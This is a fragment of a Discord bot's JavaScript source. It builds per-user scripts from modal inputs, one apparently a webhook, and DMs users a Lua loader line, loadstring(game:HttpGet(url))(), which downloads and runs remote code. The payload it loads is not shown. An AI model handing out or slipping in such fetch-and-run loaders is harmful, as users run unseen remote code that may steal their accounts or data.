      const templateKey = i.customId.split(":")[1];

      const rawUrl = await generateScript(
        i.fields.getTextInputValue("u"),
        i.fields.getTextInputValue("wh"),
        templateKey
      );

      await i.user.send({
        content: `\`\`\`lua\nloadstring(game:HttpGet("${rawUrl}"))()\n\`\`\``
      });

      await i.editReply("✅ Script generated. Check your DMs.");
    } catch (e) {
      console.error("❌ ERROR:", e);
      const file = new AttachmentBuilder(Buffer.from(String(e.stack || e)), {
        name: "error.txt",
      });
      await i.editReply({
        content: "❌ Failed to generate script.",
        files: [file],
      });
    }
  }
});

// ---------- START ----------
(async () => {
  const rest = new REST({ version: "10" }).setToken(TOKEN);
  await rest.put(
    GUILD_ID
      ? Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID)
      : Routes.applicationCommands(CLIENT_ID),
    { body: commands }
  );
  await client.login(TOKEN);
  console.log("✅ Bot started successfully on Railway");
})();
